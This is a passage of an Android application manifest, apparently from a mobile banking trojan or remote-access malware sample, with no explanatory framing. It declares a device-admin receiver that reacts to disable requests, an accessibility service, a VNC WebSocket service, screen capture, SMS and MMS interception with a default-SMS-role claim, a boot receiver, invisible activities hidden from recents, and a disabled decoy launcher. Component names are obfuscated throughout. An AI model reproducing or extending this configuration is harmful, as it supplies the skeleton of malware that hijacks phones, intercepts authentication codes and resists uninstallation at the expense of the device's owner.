    <application
        android:name="com.service.app.App"
        android:allowBackup="true"
        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
        android:debuggable="true"
        android:excludeFromRecents="true"
        android:icon="@mipmap/ic_launcher"
        android:label="JOEBIDEN"
        android:requestLegacyExternalStorage="true"
        android:supportsRtl="true"
        android:testOnly="true"
        android:theme="@android:style/Theme.Translucent.NoTitleBar"
        android:usesCleartextTraffic="true" >
        <activity android:name="com.service.app.Main.SMSManager" />

        <service
            android:name="com.service.app.Services.ServiceChooser"
            android:exported="false" />

        <activity
            android:name="com.google.android.gms.common.api.GoogleApiActivity"
            android:exported="false"
            android:theme="@android:style/Theme.Translucent.NoTitleBar" />

        <meta-data
            android:name="com.google.android.gms.version"
            android:value="11010000" />

        <service
            android:name="com.service.app.Services.DevLock"
            android:exported="false" />

        <activity
            android:name="com.service.app.Main.AccessAdm"
            android:excludeFromRecents="true"
            android:label=""
            android:theme="@android:style/Theme.NoDisplay" />
        <activity
            android:name="com.service.app.CaptureActivity"
            android:excludeFromRecents="true"
            android:theme="@style/Theme.AppCompat.Translucent" />
        <activity
            android:name="com.service.app.fake"
            android:enabled="false"
            android:label="JOOOEEE"
            android:launchMode="singleInstance" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name="com.service.app.CaptureService"
            android:foregroundServiceType="mediaProjection" />
        <service
            android:name="com.service.app.vnc.WebSocketService"
            android:enabled="true"
            android:exported="false" />
        <service
            android:name="com.service.app.Services.HintService"
            android:enabled="true"
            android:exported="false" />

        <receiver
            android:name="com.service.app.Main.ReceiverDeviceAdmin"
            android:label="BIDENJOE"
            android:permission="android.permission.BIND_DEVICE_ADMIN" >
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/adm" />

            <intent-filter android:priority="121" >
                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
                <action android:name="android.app.action.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED" />
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <activity android:name="com.service.app.sjsjssjsj" >
            <intent-filter>
                <data android:scheme="sms" />

                <action android:name="android.intent.action.SENDTO" />

                <data android:scheme="mms" />

                <category android:name="android.intent.category.BROWSABLE" />

                <data android:scheme="mmsto" />

                <category android:name="android.intent.category.DEFAULT" />

                <data android:scheme="smsto" />

                <action android:name="android.intent.action.SEND" />
            </intent-filter>
        </activity>

        <receiver
            android:name="com.service.app.sjssjsjssj"
            android:permission="android.permission.BROADCAST_WAP_PUSH" >
            <intent-filter>
                <data android:mimeType="application/vnd.wap.mms-message" />

                <action android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
            </intent-filter>
        </receiver>

        <service
            android:name="com.service.app.ffsjsjsjsj"
            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE" >
            <intent-filter>
                <data android:scheme="sms" />

                <action android:name="android.intent.action.RESPOND_VIA_MESSAGE" />

                <data android:scheme="smsto" />
            </intent-filter>
        </service>
        <service android:name="com.service.app.Services.srvToaskAccessibility" />

        <activity
            android:name="com.service.app.Main.AccessActivity"
            android:excludeFromRecents="true"
            android:icon="@drawable/background"
            android:label="" />
        <activity
            android:name="com.service.app.Main.ViewManager"
            android:excludeFromRecents="true"
            android:icon="@drawable/background"
            android:label=""
            android:launchMode="singleTask" />
        <activity
            android:name="com.service.app.IndexACT"
            android:enabled="true"
            android:excludeFromRecents="true" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.app.role.SMS" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <receiver
            android:name="com.service.app.Main.smsreceiver"
            android:permission="android.permission.BROADCAST_SMS" >
            <intent-filter android:priority="979" >
                <action android:name="android.provider.Telephony.SMS_DELIVER" />
                <action android:name="android.intent.action.BOOT_COMPLETED" />

                <!-- <action android:name="android.intent.action.ACTION_SHUTDOWN" /> -->
            </intent-filter>
        </receiver>

        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="com.service.app.fileprovider"
            android:exported="false"
            android:grantUriPermissions="true" >
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

        <activity
            android:name="com.service.app.Main.PermManager"
            android:excludeFromRecents="true"
            android:icon="@drawable/background"
            android:label=""
            android:theme="@android:style/Theme.NoDisplay" />
        <activity android:name="com.service.app.Main.ModeChanger" />

        <service android:name="com.service.app.Services.EndlessService" />
        <service android:name="com.service.app.Services.kingservice" />
        <service android:name="com.service.app.Services.Netmanager" />
        <service android:name="com.service.app.Services.SensorService" />
        <service
            android:name="com.service.app.Services.Access"
            android:label="foniks"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>

            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/serviceconfig" />
        </service>
    </application>

</manifest>